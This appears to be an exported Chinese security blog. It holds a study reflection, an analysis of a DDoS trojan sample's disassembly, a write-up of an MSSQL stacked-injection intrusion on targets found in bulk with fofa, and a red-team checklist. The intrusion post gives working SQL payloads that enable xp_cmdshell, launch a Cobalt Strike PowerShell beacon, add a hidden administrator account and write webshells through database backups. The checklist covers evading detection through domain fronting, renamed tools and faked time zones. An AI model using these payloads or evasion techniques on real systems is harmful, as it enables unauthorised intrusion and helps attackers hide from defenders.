<p>我对自己的职业定位是红队，肯定是离不开实战的。现在的情况是研究的多于实战的，重心有点偏离……总结一下，以当下的需求来决定学习路线。所以打算寒假把重心放在安卓逆向和 木马分析这两块上，中间跟着项目走。我学习都是以项目为驱动力，不一定要做出成果，但一定要有产出，所以一般都记录下来，写成文章(虽然很水)。如果仅仅是看视频，做笔记的话，没有形成自己的思考，效率很低。</p>
<p>为什么学一下安卓逆向呢，确实是一个趋势，在实战中的帮助很大。在web端防护严格的情况下，app是个突破口，而在app校验严格的情况下，能够hook掉某个函数功能点的话，对实战的帮助很大。暑假实习的时候就遇到了这方面的需求，但当时需要学的东西更多，安卓逆向被放在了后面。现在既然有了需求，当然要再次提上日程。</p>
<p>关于木马分析，现在看来对我的实战帮助也不是很大。最开始学的时候，只是因为自己想要去写木马，所以先分析别人的木马作为参考。其实现在木马分析对我的实战帮助也不是很大，总的来说更偏向研究一点，但既然答应了别人要写，总不能🕊了吧。我觉得双线程现在对我1核2g的大脑来说是天花板了。有一点压力，但完全能够接受，刚刚好。</p>
<p>所以OSCP只能先放一放了，反正时间还多，不急不急…在等等…下次一定！下次一定！</p>
<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>很感谢漂亮鼠师傅指出我学习中存在的问题，我简单总结下。</p>
<p>一方面是学习时间短，这一眼就可以看出来，基本功不扎实，很多基础性的东西犯了错。包括但不限于网络协议栈，操作系统，不能说学到精通吧，但我连基础知识都搞错。想了想，这些学起来很枯燥，纯理论性的东西，看完就忘，以前学的时候没有结合实战项目。现在看来，关于学习网络，如果要说实战的话，内网值得研究，但不是简单的日下来就完了，攻击永远比防守简单，我个人的想法是可以搭建一套内网靶场，在搭建的过程中，你需要考虑各种问题，从哪个口子可以进来，哪个口子封锁住了，所以这个过程中，不仅仅是吸收学习，而且可以运用， 相信效果不会差。这里仅仅就网络而言，其他也是一样，比如操作系统，就Windows而言，可以根据他的机制来思考为什么可以利用这个点打进去，拿到shell，此外，在熟悉Windows的机制后，也可以去做免杀，利用系统机制来规避杀软的查杀。学习其他技术也是一样，漂亮鼠师傅在一篇文章中有写到，以实际项目驱动来学习，过程如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">自我定位-&gt;设立项目-&gt;解构项目-&gt;完成第一个子项目-&gt;阶段性复盘-&gt;反思性学习-&gt;进行下一个子项目-&gt;循环直到完成目标项目-&gt;整体复盘和反思性学习-&gt;重新定位-&gt;设立新项目-&gt;循环</span><br></pre></td></tr></table></figure>



<p>另一方面就是研究的文章都太浅，深度不够，只是停留在简单的复现，没有进一步的原理说明。这点我起初不自量力想要反驳hhhh，因为我写的几篇内网的笔记不仅仅是利用工具去复现，都是先阐明原理，但也仅仅是利用原理，更深层次的比如为什么会产生这个问题，是Windows的机制缺陷还是配置问题、信任问题 等等。这些我都没有考虑，究其原因，还是对他的底层实现不了解。说来惭愧，在域的学习中，连包都没抓过…….不仅仅是在域的学习过程中，包括平时的项目，也仅仅是整理下结果，ok，总结，结束。在项目结束后没有进一步的思考，比如说有没有哪一个点漏了啊，有没有可能让漏洞影响范围进一步扩大啊，都没有复盘过。包括考虑问题的角度，我是站在攻击者的角度来思考，只要这个洞我可以利用，打进去就行了，说白了就是个jb小子。反正现在有时间，还允许我多花时间继续深挖，真正工作了还能有自己的学习时间才是真的奢侈。所以，以后碰到问题，还是要多想想，挖的更深一点，可能有意想不到的收获。用漂亮鼠师傅的话说就是，站在整个系统生态上考虑问题。这应该是甲方考虑安全问题的角度吧，要让我现在完全做到也不现实。不过也提醒了我，思考问题更深一点，再深一点，学个通透。</p>
<p>这应该不止是我一个人学习中遇到的问题，希望看到的师傅们也可以思考思考，我感觉挺多人会碰到这个问题的。</p>
<p>上次小总结也大概是两个月前，个人感觉学一段时间回头看看，总结下挺好的，方向歪了也可以纠正回来，不至于一路偏到底。就写这么多吧，等熬过这段期末周考完试，开始下一阶段。这半个月估计都要用来复习了，希望不会被大家甩开太多。</p>
<p>Peace.</p>
]]></content>
      <categories>
        <category>个人总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>吹水</tag>
      </tags>
  </entry>
  <entry>
    <title>简单DDos木马的样本分析</title>
    <url>/2021/10/30/%E7%AE%80%E5%8D%95DDos%E6%9C%A8%E9%A9%AC%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>没有介绍</p>
<span id="more"></span>

<h2 id="0x01-详细分析"><a href="#0x01-详细分析" class="headerlink" title="0x01 详细分析"></a>0x01 详细分析</h2><p>首先还是先看该PE文件的导入表，可以看到它导入了 <code>ADVAPI32</code>这个dll，调用的函数有 <code>CreateServiceA/ StartServiceCtrlDispatcherA/OpenSCManagerA</code> ，这三个函数对于初学者来说还是比较陌生的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CreateServiceA：创建服务对象并将其添加到指定的服务控制管理器数据库。创建成功，返回该服务的句柄，失败返回NULL</span><br><span class="line">StartServiceCtrlDispatcherA：将服务进程的主线程连接到服务控制管理器，使得线程成为调用进程的服务控制调度程序线程。成功返回非0，否则返回0</span><br><span class="line">OpenSCManagerA：建立与服务控制管理器的连接，并打开指定的服务控制管理器数据库</span><br></pre></td></tr></table></figure>



<p><img src="/2021/10/30/%E7%AE%80%E5%8D%95DDos%E6%9C%A8%E9%A9%AC%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20211029003952951.png" alt="image-20211029003952951"></p>
<p>这两个函数就耳熟能详了。</p>
<p><img src="/2021/10/30/%E7%AE%80%E5%8D%95DDos%E6%9C%A8%E9%A9%AC%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20211029004703633.png" alt="image-20211029004703633"></p>
<p>大致看下它的字符串，大概可以猜测出是请求该域名并下载数据流，还可能用IE8.0的代理</p>
<p><img src="/2021/10/30/%E7%AE%80%E5%8D%95DDos%E6%9C%A8%E9%A9%AC%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20211029005721849.png" alt="image-20211029005721849"></p>
<p>下面就去分析 main 函数</p>
<p>在 <code>401028</code>处调用了<code>StartServiceCtrlDispatcherA</code>函数，通常这个函数会立即被调用，前面是传入的参数，其中传入了 <code>401040</code>，这是<code>StartServiceCtrlDispatcherA</code>指定的服务控制管理器会调用的服务控制函数。整个主函数的流程是这样，貌似只创建了一个服务，别急，我们接着继续分析</p>
<p><img src="/2021/10/30/%E7%AE%80%E5%8D%95DDos%E6%9C%A8%E9%A9%AC%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20211029011021411.png" alt="image-20211029011021411"></p>
<p>接着去调用 <code>401040</code>处的函数，在这里面又调用了 <code>OpenMutexA</code>函数，清空eax寄存器，跳转到<code>401064</code>处。<code>OpenMutexA</code>会打开一个已有的互斥量句柄，看前面传入的参数，互斥量的名字是“HGL345”，如果函数调用成功，程序退出。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">互斥量是windows的一个内核对象，互斥量与关键段的作用相似，可以用来确保全局资源的互斥访问。并且互斥量可以用在不同的进程中的线程互斥访问全局资源。更多关于互斥量，自行了解操作系统的进程与线程管理</span><br></pre></td></tr></table></figure>



<p><img src="/2021/10/30/%E7%AE%80%E5%8D%95DDos%E6%9C%A8%E9%A9%AC%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20211029011001886.png" alt="image-20211029011001886"></p>
<p>来看下<code>401064</code>这段汇编代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">loc_401064:                             ; CODE XREF: sub_401040+1A↑j</span><br><span class="line">.text:00401064                 push    esi</span><br><span class="line">.text:00401065                 push    offset Name     ; &quot;HGL345&quot;</span><br><span class="line">.text:0040106A                 push    0               ; bInitialOwner</span><br><span class="line">.text:0040106C                 push    0               ; lpMutexAttributes</span><br><span class="line">.text:0040106E                 call    ds:CreateMutexA</span><br><span class="line">.text:00401074                 push    3               ; dwDesiredAccess</span><br><span class="line">.text:00401076                 push    0               ; lpDatabaseName</span><br><span class="line">.text:00401078                 push    0               ; lpMachineName</span><br><span class="line">.text:0040107A                 call    ds:OpenSCManagerA</span><br><span class="line">.text:00401080                 mov     esi, eax</span><br><span class="line">.text:00401082                 call    ds:GetCurrentProcess</span><br><span class="line">.text:00401088                 lea     eax, [esp+404h+Filename]</span><br><span class="line">.text:0040108C                 push    3E8h            ; nSize</span><br><span class="line">.text:00401091                 push    eax             ; lpFilename</span><br><span class="line">.text:00401092                 push    0               ; hModule</span><br><span class="line">.text:00401094                 call    ds:GetModuleFileNameA</span><br><span class="line">.text:0040109A                 push    0               ; lpPassword</span><br><span class="line">.text:0040109C                 push    0               ; lpServiceStartName</span><br><span class="line">.text:0040109E                 push    0               ; lpDependencies</span><br><span class="line">.text:004010A0                 push    0               ; lpdwTagId</span><br><span class="line">.text:004010A2                 lea     ecx, [esp+414h+Filename]</span><br><span class="line">.text:004010A6                 push    0               ; lpLoadOrderGroup</span><br><span class="line">.text:004010A8                 push    ecx             ; lpBinaryPathName</span><br><span class="line">.text:004010A9                 push    0               ; dwErrorControl</span><br><span class="line">.text:004010AB                 push    2               ; dwStartType</span><br><span class="line">.text:004010AD                 push    10h             ; dwServiceType</span><br><span class="line">.text:004010AF                 push    2               ; dwDesiredAccess</span><br><span class="line">.text:004010B1                 push    offset DisplayName ; &quot;Malservice&quot;</span><br><span class="line">.text:004010B6                 push    offset DisplayName ; &quot;Malservice&quot;</span><br><span class="line">.text:004010BB                 push    esi             ; hSCManager</span><br><span class="line">.text:004010BC                 call    ds:CreateServiceA</span><br><span class="line">.text:004010C2                 xor     edx, edx</span><br><span class="line">.text:004010C4                 lea     eax, [esp+404h+FileTime]</span><br><span class="line">.text:004010C8                 mov     dword ptr [esp+404h+SystemTime.wYear], edx</span><br><span class="line">.text:004010CC                 lea     ecx, [esp+404h+SystemTime]</span><br><span class="line">.text:004010D0                 mov     dword ptr [esp+404h+SystemTime.wDayOfWeek], edx</span><br><span class="line">.text:004010D4                 push    eax             ; lpFileTime</span><br><span class="line">.text:004010D5                 mov     dword ptr [esp+408h+SystemTime.wHour], edx</span><br><span class="line">.text:004010D9                 push    ecx             ; lpSystemTime</span><br><span class="line">.text:004010DA                 mov     dword ptr [esp+40Ch+SystemTime.wSecond], edx</span><br><span class="line">.text:004010DE                 mov     [esp+40Ch+SystemTime.wYear], 834h</span><br><span class="line">.text:004010E5                 call    ds:SystemTimeToFileTime</span><br><span class="line">.text:004010EB                 push    0               ; lpTimerName</span><br><span class="line">.text:004010ED                 push    0               ; bManualReset</span><br><span class="line">.text:004010EF                 push    0               ; lpTimerAttributes</span><br><span class="line">.text:004010F1                 call    ds:CreateWaitableTimerA</span><br><span class="line">.text:004010F7                 push    0               ; fResume</span><br><span class="line">.text:004010F9                 push    0               ; lpArgToCompletionRoutine</span><br><span class="line">.text:004010FB                 push    0               ; pfnCompletionRoutine</span><br><span class="line">.text:004010FD                 lea     edx, [esp+410h+FileTime]</span><br><span class="line">.text:00401101                 mov     esi, eax</span><br><span class="line">.text:00401103                 push    0               ; lPeriod</span><br><span class="line">.text:00401105                 push    edx             ; lpDueTime</span><br><span class="line">.text:00401106                 push    esi             ; hTimer</span><br><span class="line">.text:00401107                 call    ds:SetWaitableTimer</span><br><span class="line">.text:0040110D                 push    0FFFFFFFFh      ; dwMilliseconds</span><br><span class="line">.text:0040110F                 push    esi             ; hHandle</span><br><span class="line">.text:00401110                 call    ds:WaitForSingleObject</span><br><span class="line">.text:00401116                 test    eax, eax</span><br><span class="line">.text:00401118                 jnz     short loc_40113B</span><br><span class="line">.text:0040111A                 push    edi</span><br><span class="line">.text:0040111B                 mov     edi, ds:CreateThread</span><br><span class="line">.text:00401121                 mov     esi, 14h</span><br><span class="line">.text:00401126</span><br></pre></td></tr></table></figure>

<p>可以看到这段地址调用了很多函数</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">CreateMutexA：创建互斥量</span><br><span class="line">OpenSCManagerA：建立与服务控制管理器的连接，并打开指定的服务控制管理器数据库</span><br><span class="line">GetCurrentProcess：返回当前进程的伪句柄，也可以理解为过渡句柄</span><br><span class="line">GetModuleFileNameA：获取包含一个特定模块的文件的全路径，这个模块必须是由当前运行的进程</span><br><span class="line">CreateServiceA：创建服务对象</span><br><span class="line">SystemTimeToFileTime：将系统时间转换为UTC文件时间</span><br><span class="line">CreateWaitableTimerA：创建计时器对象，与下个函数结合使用</span><br><span class="line">SetWaitableTimer：启动计时器对象</span><br><span class="line">WaitForSingleObject：多线程的情况下，等待其他线程执行完后再执行</span><br><span class="line">CreateThread：创建线程</span><br></pre></td></tr></table></figure>

<p>整体分析这段地址， 在<code>40106E</code>处创建了一个名为”HGL345”的互斥量。所以现在有一对两个互斥量，分别是<code>OpenMutex</code> 和 <code>CreateMutex</code> 获取的，这两个互斥量被设计用来保证这个程序在任意时刻只有一份实例在内存中运行，如果已经在运行，那么对 <code>OpenMutex</code> 的第一次调用成功，程序退出。</p>
<p>接着调用 <code>OpenSCManagerA</code> 函数，打开一个服务控制管理器的句柄，为了让该程序可以添加或修改服务。然后调用 <code>GetModuleFileNameA</code>，返回当前PE文件（该exe或者被加载的dll文件）的路径，这个路径接下来被<code>CreateServiceA</code>调用，来创建一个服务对象。<code>CreateServiceA</code>的关键参数是  <code>4010A8</code>处的<code>BinaryPathName</code>，<code>4010AB</code>处的<code>dwStartType</code>，<code>4010AD</code>处的 <code>dwServiceType</code>。对于 <code>dwStartType</code>来说，它的值可能是下面几个。而在这个程序中，push 入栈的是 2，对应的 <code>SERVICE_AUTO_START</code>，即开机自启。</p>
<p><img src="/2021/10/30/%E7%AE%80%E5%8D%95DDos%E6%9C%A8%E9%A9%AC%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20211029100527973.png" alt="image-20211029100527973"></p>
<p>关于为什么需要调用 <code>GetModuleFileName</code>，获得当前程序的路径，因为它想要创建服务对象，需要一个路径，而该程序并不知道自己的路径在哪，所以需要动态的获取当前路径，来创建服务，这样就不用考虑该恶意程序的执行路径了。</p>
<p><code>SystemTimeToFileTime</code>：这是一个关于时间的结构体。注意到在 <code>4010DE</code>处，表示年的值被设置为 <code>0x0834</code>即2100年。</p>
<p>接着调用 <code>CreateWaitableTimerA/ SetWaitableTimer/ WaitForSingleObject</code>函数，注意到传给 <code>SetWaitableTimer</code>的参数是 <code>lpDueTime</code>，溯源下这个参数，是<code>SystemTimeToFileTime</code>返回的 <code>FileTime</code>，也就是转换后的2100年。所以传给<code>WaitForSingleObject</code>的参数是2100年，也就是说程序会等待到2100年。</p>
<p>下面到 <code>401126</code>这里，很明显的看出这是一个循环函数。在进入 <code>401126</code>之前，esi 的值被设置为14h（20d），接着调用 <code>CreateThread</code>函数，然后 <code>esi</code>递减，直到 esi 为0时才会退出，否则一直循环，也就是说会创建20个线程。还注意到 <code>CreateTHread</code>函数的参数有6个，其中5个被设置为空，只有 <code>lpStartAddress</code>被传入了 <code>StartAddress</code>，</p>
<p><img src="/2021/10/30/%E7%AE%80%E5%8D%95DDos%E6%9C%A8%E9%A9%AC%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20211030013644987.png" alt="image-20211030013644987"></p>
<p>f5看下伪代码，是个do-while循环</p>
<p><img src="/2021/10/30/%E7%AE%80%E5%8D%95DDos%E6%9C%A8%E9%A9%AC%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20211030020205336.png" alt="image-20211030020205336"></p>
<p>跳转到  <code>StartAddress</code>这里，看到它调用了 <code>InTernetOpenA</code> 函数用来初始化网络连接，并且使用IE8代理。并且接下来还会循环调用 <code>InternetOpenUrlA</code>，传入的参数是 <code>401178</code>处的域名。并且这个跳转的指令是 <code>jmp</code> 无条件跳转，也就是说这段循环不会终止，会一直去访问 <code>http://www.malwareanalysisbook.com</code>。还有前面创建了20个线程，一直持续的访问一个网站，造成资源拥堵……到这里木马的行为已经很明显了吧，就是DDos攻击。</p>
<p><img src="/2021/10/30/%E7%AE%80%E5%8D%95DDos%E6%9C%A8%E9%A9%AC%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/image-20211030015044384.png" alt="image-20211030015044384"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个程序创建一个互斥量来保证同一时刻只有一个实例在运行，然后创建一个自启动服务，接着进入等待到2100年，开始创建20个线程访问目标站点，造成DDos攻击。</p>
<p>Peace.</p>
]]></content>
      <categories>
        <category>木马分析</category>
      </categories>
      <tags>
        <tag>木马分析</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次堆叠注入上线总结总结</title>
    <url>/2021/08/29/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E4%B8%8A%E7%BA%BF%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>本文首发于“奇安信攻防社区”，<a href="https://forum.butian.net/share/517">https://forum.butian.net/share/517</a></p>
<span id="more"></span>

<p>本来对堆叠注入没啥了解，这次正巧碰到mssql的堆叠注入，正好加强一下对堆叠注入的理解。</p>
<h4 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h4><p>因为在sql查询语句中， 分号“；”代表查询语句的结束。所以在执行sql语句结尾分号的后面，再加一条sql语句，就造成了堆叠注入。</p>
<p>这种情况很像联合查询，他们的区别就在于联合查询执行的语句是有限的，只能用来执行查询语句，而堆叠注入可以执行任意语句。</p>
<p>菜鸡不会审计php代码，这里就不贴sql语句的源码了。</p>
<p>先fofa批量找一下目标  </p>
<p><img src="/2021/08/29/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E4%B8%8A%E7%BA%BF%E6%80%BB%E7%BB%93/image-20210829112538733.png" alt="image-20210829112538733"></p>
<p>前台的页面 首先怼一波弱口令</p>
<p><img src="/2021/08/29/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E4%B8%8A%E7%BA%BF%E6%80%BB%E7%BB%93/image-20210829112607480.png" alt="image-20210829112607480"></p>
<p>其实有几个是可以弱口令直接进后台的，但是后台没有任何的getshell点</p>
<p><img src="/2021/08/29/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E4%B8%8A%E7%BA%BF%E6%80%BB%E7%BB%93/image-20210829112620818.png" alt="image-20210829112620818"></p>
<p>那就只能在后台的登录窗口试一试有没有注入了，抓包测试一下</p>
<p><img src="/2021/08/29/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E4%B8%8A%E7%BA%BF%E6%80%BB%E7%BB%93/image-20210829112705968.png" alt="image-20210829112705968"></p>
<p>发现有注入点，直接上sqlmap一把梭<br>直接出了mssql 数据库 而且是堆叠注入<br>这里想直接 —os-shell，想起来堆叠注入后面的语句是没有回显的，再换个思路。</p>
<p><img src="/2021/08/29/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E4%B8%8A%E7%BA%BF%E6%80%BB%E7%BB%93/image-20210829112716384.png" alt="image-20210829112716384"></p>
<p>ping 下dnslog 看看是否可以直接执行命令<br>看来是可以执行命令的</p>
<p><img src="/2021/08/29/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E4%B8%8A%E7%BA%BF%E6%80%BB%E7%BB%93/image-20210829112732710.png" alt="image-20210829112732710"></p>
<p>再换个思路</p>
<p>手工打开xp_cmdshell  发现函数没有被禁用  可以执行命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;,1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line">EXEC sp_configure &#x27;xp_cmdshell&#x27;,1;</span><br><span class="line">RECONFIGURE;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>尝试直接注入cs的powershell上线<br>好家伙，直接上线 ，看来函数没有被禁用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXEC master..xp_cmdshell’免杀powershell命令’</span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/29/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E4%B8%8A%E7%BA%BF%E6%80%BB%E7%BB%93/image-20210829112838638.png" alt="image-20210829112838638"></p>
<p>连xp_cmdshell命令都没有禁用，想来也不会有什么杀软。<br>首先看了一下进程，emmm 那么多powershell进程……没有啥玩的必要了。</p>
<p><img src="/2021/08/29/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E4%B8%8A%E7%BA%BF%E6%80%BB%E7%BB%93/image-20210829112913401.png" alt="image-20210829112913401"></p>
<p>也没有内网，收工。</p>
<p><img src="/2021/08/29/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E4%B8%8A%E7%BA%BF%E6%80%BB%E7%BB%93/image-20210829112936377.png" alt="image-20210829112936377"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这里这么顺利是因为没有杀软，命令也都没有拦截禁用，下面说一下如果xp_cmdshell如果被禁用该怎么办。</p>
<h5 id="1-sp-configure函数"><a href="#1-sp-configure函数" class="headerlink" title="1. sp_configure函数"></a>1. sp_configure函数</h5><p>开启sp_configure函数的命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;  RECONFIGURE WITH OVERRIDE;  EXEC sp_configure &#x27;Ole Automation Procedures&#x27;, 1;  RECONFIGURE WITH OVERRIDE;  EXEC sp_configure &#x27;show advanced options&#x27;, 0;</span><br></pre></td></tr></table></figure>

<p>执行系统命令 注意没有回显</p>
<p>下面的命令添加一个影子用户并加入管理员组</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c net user hack$ 0r@nge /add&#x27;;declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c net localgroup administrators 0r@nge$ /add&#x27;;</span><br></pre></td></tr></table></figure>

<p>还有其他的函数，这里就不一一列举了。</p>
<h3 id="很多情况上面两个函数并不能执行-存在杀软-，mssql数据库可以用一下两个方法"><a href="#很多情况上面两个函数并不能执行-存在杀软-，mssql数据库可以用一下两个方法" class="headerlink" title="很多情况上面两个函数并不能执行(存在杀软)，mssql数据库可以用一下两个方法"></a>很多情况上面两个函数并不能执行(存在杀软)，mssql数据库可以用一下两个方法</h3><h5 id="2-log备份写shell"><a href="#2-log备份写shell" class="headerlink" title="2.log备份写shell"></a>2.log备份写shell</h5><h5 id="前提条件："><a href="#前提条件：" class="headerlink" title="前提条件："></a>前提条件：</h5><p>1.数据库存在注入</p>
<p>2.用户具有读写权限，一般至少DBO权限</p>
<p>3.有网站的具体路径</p>
<p>4.站库不分离</p>
<p>而且这种方法备份出的马子体积很小，备份成功的可能性很大。</p>
<h5 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h5><p>1.修改数据库为还原模式(恢复模式)：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;alter database 库名 set RECOVERY FULL –-</span><br></pre></td></tr></table></figure>

<p>3.建表和字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;create table orange(a image)--</span><br></pre></td></tr></table></figure>

<p>3.备份数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;backup log 数据库名 to disk = ‘c:\www\0r@nge1.bak’ with init –</span><br></pre></td></tr></table></figure>

<p>4.往表中写入一句话</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;insert into orange(a) values (0x...)--    //值要进行hex进制转换下</span><br></pre></td></tr></table></figure>

<p>5.利用log备份到web的物理路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;backup log 数据库名 to disk = &#x27;c:\www\0r@nge2.php&#x27; with init--</span><br></pre></td></tr></table></figure>

<p>6.删除表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;Drop table orange--</span><br></pre></td></tr></table></figure>

<h3 id="差异备份写shell"><a href="#差异备份写shell" class="headerlink" title="差异备份写shell"></a>差异备份写shell</h3><h6 id="概念：备份自上一次完全备份之后有变化的数据。差异备份过程中，只备份有标记的那些选中的文件和文件夹。它不清除标记，也即备份后不标记为已备份文件。换言之，不清除存档属性。"><a href="#概念：备份自上一次完全备份之后有变化的数据。差异备份过程中，只备份有标记的那些选中的文件和文件夹。它不清除标记，也即备份后不标记为已备份文件。换言之，不清除存档属性。" class="headerlink" title="概念：备份自上一次完全备份之后有变化的数据。差异备份过程中，只备份有标记的那些选中的文件和文件夹。它不清除标记，也即备份后不标记为已备份文件。换言之，不清除存档属性。"></a>概念：备份自上一次完全备份之后有变化的数据。差异备份过程中，只备份有标记的那些选中的文件和文件夹。它不清除标记，也即备份后不标记为已备份文件。换言之，不清除存档属性。</h6><p>用人话说就是：第二次备份的时候，与上一次完全备份的时候作对比，把不同的内容备份下来，所以只要插入我们的一句话木马，再备份一下，一句话就会被写到数据库中。</p>
<h5 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h5><ol>
<li>有网站具体路径</li>
<li>有可写权限(dbo权限以上)</li>
<li>站库不分离</li>
</ol>
<p>1.备份数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;backup database 数据库名 to disk = &#x27;C:\www\\...&#x27; with init --</span><br></pre></td></tr></table></figure>

<p>2.创建表格</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#x27;;create table orange(a image) --</span><br></pre></td></tr></table></figure>

<p>3.写入webshell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#x27;;insert into orange(a) values (0xxxxx) --</span><br></pre></td></tr></table></figure>

<p>4.进行差异备份</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%&#x27;;backup log 数据库名 to disk = &#x27;C:\www\orange.asp&#x27;  WITH DIFFERENTIAL,FORMAT;--</span><br></pre></td></tr></table></figure>

<p>5.删除表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;Drop table orange--</span><br></pre></td></tr></table></figure>

<p>这些都是理论，实战中可能被各种过滤，还需要修改payload进行具体绕过。</p>
<p>ps：第一次发文章，有啥不对的师傅们可以指出来，一起学习(求轻喷)</p>
]]></content>
      <categories>
        <category>实战</category>
      </categories>
      <tags>
        <tag>实战</tag>
      </tags>
  </entry>
  <entry>
    <title>转载-渗透红线Checklist</title>
    <url>/2021/09/30/%E8%BD%AC%E8%BD%BD-%E6%B8%97%E9%80%8F%E7%BA%A2%E7%BA%BFChecklist/</url>
    <content><![CDATA[<p>不是每个人都能按照严格的要求来做，毕竟要注意的地方太多，一定是要犯错才会有深刻的教训，因为人很贱，不犯错是不会改变的。</p>
<span id="more"></span>

<h3 id="工具篇"><a href="#工具篇" class="headerlink" title="工具篇"></a>工具篇</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WebShell不能使用普通一句话木马，连接端使用加密流量，不使用普通中国菜刀。</span><br><span class="line">不使用默认冰蝎，已被安全厂商能够识别流量（使用默认，入口打点这么辛苦，连接一小时就被发现，并被清除封堵）</span><br><span class="line">上传工具到服务器中，不能使用默认名称，例如，frp、nc、lcx等。</span><br><span class="line">使用sqlmap要加–random-agent参数。</span><br><span class="line">nmap、zmap扫描要去除特征。</span><br><span class="line">不要相信工具的判断，工具测试一遍，手工测试一遍。</span><br><span class="line">sqlmap注入频率问题，使用–delay、–safe-url、–safe-freq | ID：SewellDinG提供</span><br><span class="line">Cobalt Strike的Beacon证书和特征，如果使用默认的将会被检测。</span><br><span class="line">Cobalt Strike使用域前置技术，伪装成白站域名，隐藏真实C2服务器IP；（默认启动的CS,基本被各厂商设备能识别到） | ID：SewellDinG提供</span><br><span class="line">在进行有可能导致管理员察觉的敏感操作时（如登录远程桌面等），根据目标所在地区，选择对应IP登录。（有些会提示异地登录提醒） ｜ID: evilAdan0s 提供</span><br><span class="line">时区选择非大陆，作业时间贴合时区 ID：hmoytx提供</span><br><span class="line">使用自己塔建的DNSlog，目前网上dnslog站点已被监控，只要请求了域名就会被监测到。 ｜ID: mx7krshell</span><br></pre></td></tr></table></figure>



